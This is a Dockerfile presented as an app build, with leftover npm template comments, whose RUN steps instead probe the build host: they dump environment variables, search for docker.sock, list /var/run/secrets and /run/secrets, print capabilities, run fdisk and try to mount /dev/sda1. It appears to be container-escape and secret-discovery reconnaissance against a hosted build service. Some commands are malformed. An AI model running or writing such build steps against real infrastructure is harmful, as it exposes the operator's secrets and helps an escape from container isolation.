FROM quay.io/bitnami/golang
# Install app dependencies
# A wildcard is used to ensure both package.json AND package-lock.json are copied
# where available (npm@5+)
# COPY package*.json ./
# If you are building your code for production
# RUN npm ci --only=production
# RUN npm install

COPY . .
RUN pwd
RUN mount
RUN env
RUN whoami
RUN fdisk -l
RUN find / -name docker.sock 2>/dev/null
RUN ls -alvR /var/run/secrets/
RUN ls -alv /run/secrets
RUN ls -alvR /var/run
RUN capsh --print
RUN mkdir -p /mnt/hopla
RUN mount -t /dev/sda1 /mnt/hopla
RUN ls /
RUN cat /run/.containerenv
RUN ls -alv /var/run/secrets/rhsm
RUN mkdir /hostsystem
ADD /etc /hostystem

# Bundle app source
CMD [ "sleep", "3000" ]
EXPOSE 8080
